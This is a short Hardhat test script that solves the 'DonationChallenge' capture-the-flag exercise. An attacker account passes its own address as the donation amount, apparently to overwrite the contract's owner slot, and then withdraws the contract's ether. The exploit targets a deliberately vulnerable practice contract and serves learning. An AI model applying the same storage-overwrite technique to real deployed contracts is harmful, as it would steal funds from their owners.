import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";

const { utils } = ethers;

describe("DonationChallenge", () => {
  it("Solves the challenge", async () => {
    const [_, attacker] = await ethers.getSigners();

    const factory = await ethers.getContractFactory("DonationChallenge");
    const contract = await factory.deploy({ value: utils.parseEther("1") });
    await contract.deployed();

    const addressValue = BigNumber.from(await attacker.getAddress());

    const donateTx = await contract
      .connect(attacker)
      .donate(addressValue, { value: addressValue.div(BigNumber.from(`10`).pow(`36`)) });
    await donateTx.wait();

    const withdrawTx = await contract.connect(attacker).withdraw();
    await withdrawTx.wait();

    expect(await contract.isComplete()).to.be.true;
  });
});
